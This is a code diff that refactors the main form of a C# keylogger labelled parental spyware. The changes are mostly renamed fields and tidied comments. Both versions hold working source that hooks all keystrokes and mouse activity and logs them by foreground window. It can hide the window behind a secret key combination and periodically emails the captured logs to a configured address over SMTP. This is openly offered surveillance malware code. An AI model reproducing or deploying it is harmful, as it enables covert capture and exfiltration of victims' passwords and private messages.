@@ -1,5 +1,5 @@
 ﻿// --------------------------------------------------------------------------------------------------------------------
-// <copyright file="frmMain.cs" company="">
+// <copyright file="frmMain.cs" company="Nonoe">
 //   
 // </copyright>
 // <summary>
@@ -12,6 +12,7 @@ namespace KeyLogger
     using System;
     using System.Collections;
     using System.Diagnostics;
+    using System.Globalization;
     using System.IO;
     using System.Net;
     using System.Net.Mail;
@@ -21,7 +22,7 @@ namespace KeyLogger
     using Nonoe.ParentalSpyware.Core.Utils;
 
     /// <summary>
-    /// The frm main.
+    /// The main form.
     /// </summary>
     public partial class FrmMain : Form
     {
@@ -30,77 +31,77 @@ namespace KeyLogger
         /// <summary>
         /// The _option.
         /// </summary>
-        private readonly Frmoptions _option;
+        private readonly Frmoptions option;
 
         /// <summary>
-        /// The _allowto tik.
+        /// The allow to tick.
         /// </summary>
-        private bool _allowtoTik;
+        private bool allowToTick;
 
         /// <summary>
-        /// The _app names.
+        /// The application names.
         /// </summary>
-        private Stack _appNames;
+        private Stack appNames;
 
         /// <summary>
-        /// The _emailparams.
+        /// The email parameters.
         /// </summary>
-        private Params _emailparams;
+        private Params emailParams;
 
         /// <summary>
-        /// The _hooker.
+        /// The hooker.
         /// </summary>
-        private UserActivityHook _hooker;
+        private UserActivityHook hooker;
 
         /// <summary>
-        /// The _is alt down.
+        /// The is alt down.
         /// </summary>
-        private bool _isAltDown;
+        private bool isAltDown;
 
         /// <summary>
-        /// The _is control down.
+        /// The is control down.
         /// </summary>
-        private bool _isControlDown;
+        private bool isControlDown;
 
         /// <summary>
-        /// The _is emailer on.
+        /// The is emailer on.
         /// </summary>
-        private bool _isEmailerOn;
+        private bool isEmailerOn;
 
         /// <summary>
-        /// The _is fs down.
+        /// The is function keys down.
         /// </summary>
-        private bool _isFsDown;
+        private bool isFsDown;
 
         /// <summary>
-        /// The _is hide.
+        /// The is hide.
         /// </summary>
-        private bool _isHide;
+        private bool isHide;
 
         /// <summary>
-        /// The _is logger on.
+        /// The is logger on.
         /// </summary>
-        private bool _isLoggerOn;
+        private bool isLoggerOn;
 
         /// <summary>
-        /// The _is shift down.
+        /// The is shift down.
         /// </summary>
-        private bool _isShiftDown;
+        private bool isShiftDown;
 
         /// <summary>
-        /// The _log data.
+        /// The log data.
         /// </summary>
-        private Hashtable _logData;
+        private Hashtable logData;
 
         /// <summary>
-        /// The _logfilepath.
+        /// The log file path.
         /// </summary>
-        private string _logfilepath = Application.StartupPath + @"\Acitivitylog.xml";
+        private string logFilePath = Application.StartupPath + @"\Acitivitylog.xml";
 
         /// <summary>
-        /// The _tik.
+        /// The tick.
         /// </summary>
-        private int _tik;
+        private int tick;
 
         #endregion
 
@@ -112,7 +113,7 @@ namespace KeyLogger
         public FrmMain()
         {
             this.InitializeComponent();
-            this._option = new Frmoptions();
+            this.option = new Frmoptions();
         }
 
         #endregion
@@ -138,7 +139,7 @@ namespace KeyLogger
 
                 var fromAddress = new MailAddress(mailaddress, "CSKeylogger");
                 var toAddress = new MailAddress(mailaddress, "CSKeylogger");
-                const string subject = "Key logger Log file !";
+                const string Subject = "Key logger Log file !";
                 var smtp = new SmtpClient
                                {
                                    Host = smtpHost, 
@@ -148,7 +149,7 @@ namespace KeyLogger
                                    UseDefaultCredentials = false, 
                                    Credentials = new NetworkCredential(fromAddress.Address, mailpassword)
                                };
-                using (var message = new MailMessage(fromAddress, toAddress) { Subject = subject, Body = logstr, })
+                using (var message = new MailMessage(fromAddress, toAddress) { Subject = Subject, Body = logstr, })
                 {
                     smtp.Send(message);
                 }
@@ -162,12 +163,8 @@ namespace KeyLogger
         /// <summary>
         /// The hooker key down.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The key event argument.</param>
         public void HookerKeyDown(object sender, KeyEventArgs e)
         {
             if (e.KeyData.ToString() == "Return")
@@ -185,57 +182,55 @@ namespace KeyLogger
             {
                 case "RMenu":
                 case "LMenu":
-                    this._isAltDown = true;
+                    this.isAltDown = true;
                     break;
                 case "RControlKey":
                 case "LControlKey":
-                    this._isControlDown = true;
+                    this.isControlDown = true;
                     break;
                 case "LShiftKey":
                 case "RShiftKey":
-                    this._isShiftDown = true;
+                    this.isShiftDown = true;
                     break;
                 case "F10":
                 case "F11":
                 case "F12":
-                    this._isFsDown = true;
+                    this.isFsDown = true;
                     break;
             }
 
-            if (this._isAltDown && this._isControlDown && this._isShiftDown && this._isFsDown)
+            if (!this.isAltDown || !this.isControlDown || !this.isShiftDown || !this.isFsDown)
             {
-                if (this._isHide)
-                {
-                    this.Show();
-                    this._isHide = false;
-                }
-                else
-                {
-                    this.Hide();
-                    this._isHide = true;
-                }
+                return;
+            }
+
+            if (this.isHide)
+            {
+                this.Show();
+                this.isHide = false;
+            }
+            else
+            {
+                this.Hide();
+                this.isHide = true;
             }
         }
 
         /// <summary>
         /// The hooker key press.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         public void HookerKeyPress(object sender, KeyPressEventArgs e)
         {
-            this._allowtoTik = true;
+            this.allowToTick = true;
             if ((byte)e.KeyChar == 9)
             {
                 this.Logger("[TAB]");
             }
             else if (char.IsLetterOrDigit(e.KeyChar) || char.IsPunctuation(e.KeyChar))
             {
-                this.Logger(e.KeyChar.ToString());
+                this.Logger(e.KeyChar.ToString(CultureInfo.InvariantCulture));
             }
             else if (e.KeyChar == 32)
             {
@@ -247,18 +242,14 @@ namespace KeyLogger
                 this.Logger("[Char\\" + ((byte)e.KeyChar) + "]");
             }
 
-            this._tik = 0;
+            this.tick = 0;
         }
 
         /// <summary>
         /// The hooker key up.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         public void HookerKeyUp(object sender, KeyEventArgs e)
         {
             // Logger("KeyUP : " + e.KeyData.ToString() + Environment.NewLine);
@@ -266,20 +257,20 @@ namespace KeyLogger
             {
                 case "RMenu":
                 case "LMenu":
-                    this._isAltDown = false;
+                    this.isAltDown = false;
                     break;
                 case "RControlKey":
                 case "LControlKey":
-                    this._isControlDown = false;
+                    this.isControlDown = false;
                     break;
                 case "LShiftKey":
                 case "RShiftKey":
-                    this._isShiftDown = false;
+                    this.isShiftDown = false;
                     break;
                 case "F10":
                 case "F11":
                 case "F12":
-                    this._isFsDown = false;
+                    this.isFsDown = false;
                     break;
             }
         }
@@ -287,12 +278,8 @@ namespace KeyLogger
         /// <summary>
         /// The mouse moved.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         public void MouseMoved(object sender, MouseEventArgs e)
         {
             this.labelMousePosition.Text = string.Format("X:{0},Y={1},Wheel:{2}", e.X, e.Y, e.Delta);
@@ -310,55 +297,43 @@ namespace KeyLogger
         #region Methods
 
         /// <summary>
-        /// The btn exit click.
+        /// The exit button click event handler.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void BtnExitClick(object sender, EventArgs e)
         {
             Application.Exit();
         }
 
         /// <summary>
-        /// The btn hide click.
+        /// The hide button click event handler.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument. </param>
         private void BtnHideClick(object sender, EventArgs e)
         {
             this.Hide();
-            this._hooker.Start();
-            this._isHide = true;
+            this.hooker.Start();
+            this.isHide = true;
         }
 
         /// <summary>
         /// The button start click.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void ButtonStartClick(object sender, EventArgs e)
         {
-            if (!this._hooker.IsActive)
+            if (!this.hooker.IsActive)
             {
-                this._hooker.Start();
-                if (this._isEmailerOn)
+                this.hooker.Start();
+                if (this.isEmailerOn)
                 {
                     this.timer_emailer.Enabled = true;
                 }
 
-                if (this._isLoggerOn)
+                if (this.isLoggerOn)
                 {
                     this.timer_logsaver.Enabled = true;
                 }
@@ -368,61 +343,57 @@ namespace KeyLogger
         /// <summary>
         /// The button stop click.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void ButtonStopClick(object sender, EventArgs e)
         {
-            if (this._hooker.IsActive)
+            if (this.hooker.IsActive)
             {
-                this._hooker.Stop();
+                this.hooker.Stop();
                 this.timer_emailer.Enabled = false;
                 this.timer_logsaver.Enabled = false;
             }
         }
 
         /// <summary>
-        /// The generatelog.
+        /// The log generation.
         /// </summary>
-        /// <returns>
-        /// The <see cref="string"/>.
-        /// </returns>
+        /// <returns>The log</returns>
         private string Generatelog()
         {
             try
             {
-                string Logdata = "CS Key logger Log Data" + Environment.NewLine;
+                string logdata = string.Format("CS Key logger Log Data{0}", Environment.NewLine);
 
-                IDictionaryEnumerator element = this._logData.GetEnumerator();
+                IDictionaryEnumerator element = this.logData.GetEnumerator();
                 while (element.MoveNext())
                 {
                     string processname =
                         element.Key.ToString()
                                .Trim()
-                               .Substring(0, element.Key.ToString().Trim().LastIndexOf("######"))
+                               .Substring(0, element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal))
                                .Trim();
                     string applname =
                         element.Key.ToString()
                                .Trim()
-                               .Substring(element.Key.ToString().Trim().LastIndexOf("######") + 6)
+                               .Substring(element.Key.ToString().Trim().LastIndexOf("######", StringComparison.Ordinal) + 6)
                                .Trim();
                     string ldata = element.Value.ToString().Trim();
 
-                    if (applname.Length < 25 && processname.Length < 25)
+                    if (applname.Length >= 25 || processname.Length >= 25)
                     {
-                        Logdata += applname.PadRight(25, '-');
-                        Logdata += processname.PadLeft(25, '-');
-                        Logdata += Environment.NewLine + "Log Data :" + Environment.NewLine;
-                        Logdata += ldata + Environment.NewLine + Environment.NewLine;
+                        continue;
                     }
+
+                    logdata += applname.PadRight(25, '-');
+                    logdata += processname.PadLeft(25, '-');
+                    logdata += Environment.NewLine + "Log Data :" + Environment.NewLine;
+                    logdata += ldata + Environment.NewLine + Environment.NewLine;
                 }
 
-                Logdata += Environment.NewLine + Environment.NewLine + Environment.NewLine
+                logdata += Environment.NewLine + Environment.NewLine + Environment.NewLine
                            + string.Format("LOG FILE, Data {0}", DateTime.Now.ToString());
-                return Logdata;
+                return logdata;
             }
             catch (Exception ex)
             {
@@ -435,9 +406,7 @@ namespace KeyLogger
         /// <summary>
         /// The logger.
         /// </summary>
-        /// <param name="txt">
-        /// The txt.
-        /// </param>
+        /// <param name="txt">The text.</param>
         private void Logger(string txt)
         {
             this.txt_Log.AppendText(txt);
@@ -446,25 +415,27 @@ namespace KeyLogger
             try
             {
                 Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
-                string _appName = p.ProcessName;
-                string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", string.Empty);
-                string _thisapplication = _appltitle + "######" + _appName;
-                if (!this._appNames.Contains(_thisapplication))
+                string appName = p.ProcessName;
+                string appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", string.Empty);
+                string thisapplication = appltitle + "######" + appName;
+                if (!this.appNames.Contains(thisapplication))
                 {
-                    this._appNames.Push(_thisapplication);
-                    this._logData.Add(_thisapplication, string.Empty);
+                    this.appNames.Push(thisapplication);
+                    this.logData.Add(thisapplication, string.Empty);
                 }
 
-                IDictionaryEnumerator en = this._logData.GetEnumerator();
+                IDictionaryEnumerator en = this.logData.GetEnumerator();
                 while (en.MoveNext())
                 {
-                    if (en.Key.ToString() == _thisapplication)
+                    if (en.Key.ToString() != thisapplication)
                     {
-                        string prlogdata = en.Value.ToString();
-                        this._logData.Remove(_thisapplication);
-                        this._logData.Add(_thisapplication, prlogdata + " " + txt);
-                        break;
+                        continue;
                     }
+
+                    string prlogdata = en.Value.ToString();
+                    this.logData.Remove(thisapplication);
+                    this.logData.Add(thisapplication, prlogdata + " " + txt);
+                    break;
                 }
             }
             catch (Exception ex)
@@ -477,81 +448,59 @@ namespace KeyLogger
         /// <summary>
         /// The main form load.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void MainFormLoad(object sender, EventArgs e)
         {
-            this._hooker = new UserActivityHook();
-            this._hooker.OnMouseActivity += this.MouseMoved;
-            this._hooker.KeyDown += this.HookerKeyDown;
-            this._hooker.KeyPress += this.HookerKeyPress;
-            this._hooker.KeyUp += this.HookerKeyUp;
-            this._hooker.Stop();
+            this.hooker = new UserActivityHook();
+            this.hooker.OnMouseActivity += this.MouseMoved;
+            this.hooker.KeyDown += this.HookerKeyDown;
+            this.hooker.KeyPress += this.HookerKeyPress;
+            this.hooker.KeyUp += this.HookerKeyUp;
+            this.hooker.Stop();
 
-            this._appNames = new Stack();
-            this._logData = new Hashtable();
+            this.appNames = new Stack();
+            this.logData = new Hashtable();
         }
 
-        // Start Menu Events
         /// <summary>
-        /// The mnu item about click.
+        /// The about menu item click event handler
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void MnuItemAboutClick(object sender, EventArgs e)
         {
-            var About = new frmAbout();
-            About.TopMost = true;
-            About.ShowDialog();
+            var about = new frmAbout { TopMost = true };
+            about.ShowDialog();
         }
 
         /// <summary>
-        /// The mnu item exit click.
+        /// The exit menu item click event handler.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void MnuItemExitClick(object sender, EventArgs e)
         {
             Application.Exit();
         }
 
         /// <summary>
-        /// The mnu item hide click.
+        /// The hide menu item click event handler.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void MnuItemHideClick(object sender, EventArgs e)
         {
             this.Hide();
-            this._hooker.Start();
-            this._isHide = true;
+            this.hooker.Start();
+            this.isHide = true;
         }
 
         /// <summary>
-        /// The mnu item save click.
+        /// The save menu item click event handler.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void MnuItemSaveClick(object sender, EventArgs e)
         {
             var savef = new SaveFileDialog
@@ -569,22 +518,19 @@ namespace KeyLogger
         // End Menu Events
 
         /// <summary>
-        /// The save logfile.
+        /// The save log file method.
         /// </summary>
-        /// <param name="pathtosave">
-        /// The pathtosave.
-        /// </param>
+        /// <param name="pathtosave">Where to save the log file.</param>
         private void SaveLogfile(string pathtosave)
         {
             try
             {
-                string xlspath = this._logfilepath.Substring(0, this._logfilepath.LastIndexOf("\\") + 1)
+                string xlspath = this.logFilePath.Substring(0, this.logFilePath.LastIndexOf("\\", System.StringComparison.Ordinal) + 1)
                                  + "ApplogXSL.xsl";
                 if (!File.Exists(xlspath))
                 {
                     File.Create(xlspath).Close();
-                    string xslcontents =
-                        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
+                    const string xslcontents = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"><xsl:template match=\"/\"> <html> <body>  <h2>CS Key logger Log file</h2>  <table border=\"1\"> <tr bgcolor=\"Silver\">  <th>Window Title</th>  <th>Process Name</th>  <th>Log Data</th> </tr> <xsl:for-each select=\"ApplDetails/Apps_Log\"><xsl:sort select=\"ApplicationName\"/> <tr>  <td><xsl:value-of select=\"ProcessName\"/></td>  <td><xsl:value-of select=\"ApplicationName\"/></td>  <td><xsl:value-of select=\"LogData\"/></td> </tr> </xsl:for-each>  </table> </body> </html></xsl:template></xsl:stylesheet>";
                     var xslwriter = new StreamWriter(xlspath);
                     xslwriter.Write(xslcontents);
                     xslwriter.Flush();
@@ -592,7 +538,7 @@ namespace KeyLogger
                 }
 
                 var writer = new StreamWriter(pathtosave, false);
-                IDictionaryEnumerator element = this._logData.GetEnumerator();
+                IDictionaryEnumerator element = this.logData.GetEnumerator();
                 writer.Write("<?xml version=\"1.0\"?>");
                 writer.WriteLine(string.Empty);
                 writer.Write("<?xml-stylesheet type=\"text/xsl\" href=\"ApplogXSL.xsl\"?>");
@@ -606,7 +552,7 @@ namespace KeyLogger
                     string processname = "<![CDATA["
                                          + element.Key.ToString()
                                                   .Trim()
-                                                  .Substring(0, element.Key.ToString().Trim().LastIndexOf("######"))
+                                                  .Substring(0, element.Key.ToString().Trim().LastIndexOf("######", System.StringComparison.Ordinal))
                                                   .Trim() + "]]>";
                     processname = processname.Replace("\0", string.Empty);
                     writer.Write(processname);
@@ -616,7 +562,7 @@ namespace KeyLogger
                     string applname = "<![CDATA["
                                       + element.Key.ToString()
                                                .Trim()
-                                               .Substring(element.Key.ToString().Trim().LastIndexOf("######") + 6)
+                                               .Substring(element.Key.ToString().Trim().LastIndexOf("######", System.StringComparison.Ordinal) + 6)
                                                .Trim() + "]]>";
                     writer.Write(applname);
                     writer.Write("</ApplicationName>");
@@ -641,26 +587,22 @@ namespace KeyLogger
         /// <summary>
         /// The timer 1 tick.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void Timer1Tick(object sender, EventArgs e)
         {
-            if (this._allowtoTik)
+            if (this.allowToTick)
             {
-                this._tik += 1;
+                this.tick += 1;
 
-                if (this._tik != 20)
+                if (this.tick != 20)
                 {
                     return;
                 }
 
                 this.Logger(Environment.NewLine);
-                this._tik = 0;
-                this._allowtoTik = false;
+                this.tick = 0;
+                this.allowToTick = false;
             }
 
             if (this.txt_CurrentWindowstitle.Text == this.Text)
@@ -672,94 +614,82 @@ namespace KeyLogger
         /// <summary>
         /// The timer emailer tick.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void TimerEmailerTick(object sender, EventArgs e)
         {
             string logstr = this.Generatelog();
-            var _params = new Params(
+            var parameters = new Params(
                 logstr, 
-                this._emailparams.Mailaddress, 
-                this._emailparams.Mailpassword, 
-                this._emailparams.SmtpHost, 
-                this._emailparams.SmtpPort, 
-                this._emailparams.EnableSsl);
+                this.emailParams.Mailaddress, 
+                this.emailParams.Mailpassword, 
+                this.emailParams.SmtpHost, 
+                this.emailParams.SmtpPort, 
+                this.emailParams.EnableSsl);
             var mailer = new Thread(SendMail);
-            mailer.Start(_params);
+            mailer.Start(parameters);
         }
 
         /// <summary>
         /// The timer logsaver tick.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void TimerLogsaverTick(object sender, EventArgs e)
         {
-            this.SaveLogfile(this._logfilepath);
+            this.SaveLogfile(this.logFilePath);
         }
 
         /// <summary>
         /// The mnu item_ settings_ click.
         /// </summary>
-        /// <param name="sender">
-        /// The sender.
-        /// </param>
-        /// <param name="e">
-        /// The e.
-        /// </param>
+        /// <param name="sender">The sender argument.</param>
+        /// <param name="e">The event argument.</param>
         private void mnuItem_Settings_Click(object sender, EventArgs e)
         {
             // we don't want log our email password!
-            if (this._hooker.IsActive)
+            if (this.hooker.IsActive)
             {
-                this._hooker.Stop();
+                this.hooker.Stop();
             }
 
-            if (this._option.ShowDialog() == DialogResult.OK)
+            if (this.option.ShowDialog() == DialogResult.OK)
             {
-                if (this._option.chk_autoemailer.Checked)
+                if (this.option.chk_autoemailer.Checked)
                 {
-                    this._emailparams = new Params(
+                    this.emailParams = new Params(
                         null, 
-                        this._option.txt_emailAddress.Text, 
-                        this._option.txt_emailpassword.Text, 
-                        this._option.txt_smtpServer.Text, 
-                        Convert.ToInt32(this._option.txt_smtpport.Text), 
-                        this._option.chk_usessl.Checked);
+                        this.option.txt_emailAddress.Text, 
+                        this.option.txt_emailpassword.Text, 
+                        this.option.txt_smtpServer.Text, 
+                        Convert.ToInt32(this.option.txt_smtpport.Text), 
+                        this.option.chk_usessl.Checked);
 
-                    this.timer_emailer.Interval = (int)(this._option.numeric_emailtime.Value * 60000);
+                    this.timer_emailer.Interval = (int)(this.option.numeric_emailtime.Value * 60000);
                     this.timer_emailer.Enabled = true;
-                    this._isEmailerOn = true;
+                    this.isEmailerOn = true;
                 }
                 else
                 {
                     this.timer_emailer.Enabled = false;
-                    this._isEmailerOn = false;
+                    this.isEmailerOn = false;
                 }
 
-                if (this._option.chk_autosaver.Checked)
+                if (this.option.chk_autosaver.Checked)
                 {
-                    if (this._option.txt_filelocation.Text.ToLower() != "Activitylog.xml".ToLower())
+                    if (this.option.txt_filelocation.Text.ToLower() != "Activitylog.xml".ToLower())
                     {
-                        this._logfilepath = this._option.txt_filelocation.Text;
+                        this.logFilePath = this.option.txt_filelocation.Text;
                     }
 
-                    this.timer_logsaver.Interval = (int)(this._option.numeric_savetimer.Value * 60000);
+                    this.timer_logsaver.Interval = (int)(this.option.numeric_savetimer.Value * 60000);
                     this.timer_logsaver.Enabled = true;
-                    this._isLoggerOn = true;
+                    this.isLoggerOn = true;
                 }
                 else
                 {
                     this.timer_logsaver.Enabled = false;
-                    this._isLoggerOn = false;
+                    this.isLoggerOn = false;
                 }
             }
         }
@@ -810,26 +740,13 @@ namespace KeyLogger
             /// <summary>
             /// Initializes a new instance of the <see cref="Params"/> class.
             /// </summary>
-            /// <param name="logstr">
-            /// The logstr.
-            /// </param>
-            /// <param name="mailaddress">
-            /// The mailaddress.
-            /// </param>
-            /// <param name="mailpassword">
-            /// The mailpassword.
-            /// </param>
-            /// <param name="smtpHost">
-            /// The smtp host.
-            /// </param>
-            /// <param name="smtpPort">
-            /// The smtp port.
-            /// </param>
-            /// <param name="enablessl">
-            /// The enablessl.
-            /// </param>
-            public Params(
-                string logstr, string mailaddress, string mailpassword, string smtpHost, int smtpPort, bool enablessl)
+            /// <param name="logstr">The logstr.</param>
+            /// <param name="mailaddress">The mailaddress.</param>
+            /// <param name="mailpassword">The mailpassword.</param>
+            /// <param name="smtpHost">The smtp host.</param>
+            /// <param name="smtpPort">The smtp port.</param>
+            /// <param name="enablessl">The enablessl.</param>
+            public Params(string logstr, string mailaddress, string mailpassword, string smtpHost, int smtpPort, bool enablessl)
             {
                 this.Logstr = logstr;
                 this.Mailaddress = mailaddress;
